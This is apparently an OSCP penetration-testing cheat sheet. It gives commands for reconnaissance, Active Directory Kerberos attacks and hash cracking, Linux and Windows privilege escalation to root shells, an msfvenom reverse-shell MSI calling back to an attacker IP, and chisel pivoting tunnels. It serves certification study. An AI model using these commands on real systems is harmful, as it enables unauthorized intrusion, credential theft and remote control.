# Offensive Security Certified Professional (OSCP) — Deep Field Reference

## 1. Network Reconnaissance & Port Scanning

### Masscan Fast Sweeping (Rate-Limited to Avoid Dropped Packets)
```bash
# Sweep all 65535 TCP ports at 1000 pps
masscan -p1-65535 10.10.10.0/24 --rate=1000 -e tun0 -oG masscan_all.gnmap

# Extract open ports cleanly for Nmap targeted pass
ports=$(grep -oP '\d+/open' masscan_all.gnmap | cut -d '/' -f 1 | sort -u | tr '\n' ',' | sed 's/,$//')
```

### Targeted Nmap Script & Service Enumeration
```bash
# Detailed script scan against discovered open ports
nmap -sC -sV -p$ports -Pn -v -oA nmap_targeted 10.10.10.150

# Target specific NSE vulnerability scripts
nmap --script "vuln and safe" -p$ports 10.10.10.150
```

---

## 2. Active Directory Enumeration & Kerberos Attack Paths

```
                 ACTIVE DIRECTORY KILL CHAIN (OSCP SCOPE)
 ┌────────────────┐     ┌────────────────┐     ┌────────────────┐     ┌────────────────┐
 │ Anonymous LDAP │ ──> │ AS-REP Roast   │ ──> │ Kerberoasting  │ ──> │ DCSync / Silver│
 │ & RPC Null-Sess│     │ (No Pre-Auth)  │     │ (SPN Accounts) │     │ Ticket Admin   │
 └────────────────┘     └────────────────┘     └────────────────┘     └────────────────┘
```

### Initial RPC / SMB / LDAP Null Session Probing
```bash
# Enumerate Domain Users & Shares via Null Session / Guest Account
crackmapexec smb 10.10.10.150 -u '' -p '' --shares --users
rpcclient -U "" -N 10.10.10.150 -c "enumdomusers; enumdomgroups; querydominfo"
ldapsearch -x -H ldap://10.10.10.150 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

### Kerberos Attack Vectors

#### 1. AS-REP Roasting (Accounts with `DONT_REQ_PREAUTH`)
```bash
# Impacket AS-REP extraction for users without pre-auth requirement
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.150

# Crack AS-REP Hashcat mode 18200
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### 2. Kerberoasting (Service Principal Names - SPNs)
```bash
# Request TGS tickets for SPNs and dump cracking format
impacket-GetUserSPNs corp.local/svc_user:Password123 -dc-ip 10.10.10.150 -request -outputfile kerberoast_hashes.txt

# Crack TGS-REP Hashcat mode 13100
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

#### 3. BloodHound Domain Cartography (SharpHound & BloodHound.py)
```bash
# From Linux attack machine:
bloodhound-python -u 'jdoe' -p 'P@ssword1' -d corp.local -dc dc01.corp.local -c All -ns 10.10.10.150

# Key Cypher Queries to execute in BloodHound:
# Find Shortest Paths to Domain Admins
MATCH (src:User {name:'JDOE@CORP.LOCAL'}), (dst:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}), p=shortestPath((src)-[*1..15]->(dst)) RETURN p;

# Find GenericAll / WriteDacl permissions on Groups
MATCH (u:User)-[r:GenericAll|WriteDacl|AllExtendedRights]->(g:Group) RETURN u,r,g;
```

---

## 3. Privilege Escalation Heuristics

### Linux Local Privilege Escalation

1. **Sudo Token Abuse & LD_PRELOAD**:
   ```bash
   sudo -l
   # If env_keep += LD_PRELOAD is present:
   # Compile stub:
   # #include <stdio.h>
   # #include <sys/types.h>
   # #include <unistd.h>
   # void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
   gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
   sudo LD_PRELOAD=/tmp/pe.so /usr/bin/allowed_cmd
   ```

2. **SUID Capabilities & Binaries**:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   getcap -r / 2>/dev/null
   # E.g., /usr/bin/python3.10 = cap_setuid+ep
   python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```

3. **Cronjobs & Path Traversal Injection**:
   ```bash
   # Monitor processes using pspy64
   ./pspy64 -pf -i 1000
   ```

### Windows Local Privilege Escalation

1. **Unquoted Service Paths**:
   ```cmd
   wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
   :: If path is C:\Program Files\Custom App\service.exe -> Place payload at C:\Program Files\Custom.exe
   ```

2. **AlwaysInstallElevated Registry Key**:
   ```cmd
   reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   :: If both return 0x1, generate MSI payload:
   :: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o rev.msi
   :: msiexec /quiet /qn /i rev.msi
   ```

3. **Token Impersonation (SeImpersonatePrivilege / SeAssignPrimaryToken)**:
   ```cmd
   whoami /priv
   :: Use GodPotato / SweetPotato / PrintSpoofer depending on OS Build:
   PrintSpoofer.exe -i -c cmd.exe
   GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
   ```

---

## 4. Lateral Movement & Pivoting Tactics

### Chisel Dynamic SOCKS5 Tunneling
```bash
# Attacker side (Server listening on 8000, socks on 1080)
chisel server --port 8000 --reverse

# Target Pivot Node (Client connecting back and creating reverse SOCKS)
chisel client 10.10.14.5:8000 R:socks

# /etc/proxychains4.conf
# socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn -p 88,135,139,445,3389 172.16.1.10
```

### SSH Dynamic Forwarding & Sshuttle
```bash
# Dynamic SOCKS over SSH
ssh -D 1080 -N -f user@pivot-host

# Transparent IP subnet routing via SSH (no proxychains needed)
sshuttle -r user@pivot-host 172.16.1.0/24 -v
```
